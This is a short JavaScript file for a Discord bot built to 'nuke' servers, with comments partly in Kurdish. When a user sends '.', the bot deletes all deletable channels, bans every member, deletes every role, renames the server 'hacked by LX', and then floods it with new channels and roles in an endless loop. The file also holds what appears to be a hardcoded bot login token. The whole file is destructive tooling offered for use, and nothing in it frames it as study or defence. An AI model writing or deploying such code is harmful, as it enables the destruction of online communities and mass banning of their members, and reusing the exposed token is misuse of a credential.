const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("hacked by LX");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("LX15.0", "text");///////bo channel 
        message.guild.createChannel("LX15.0", "voice");////bo voice
        message.guild.createRole({ name: "LX15.0" });////nawek dane bo role kan
      });
    }
  }
});

client.login("ODA3NzQ2NjI0MDYyNjE5Njg4.GY4XcT.1Ph6dg1ZuXwOEwCQdvII6i4Xd_z2IthvK3c7y8")
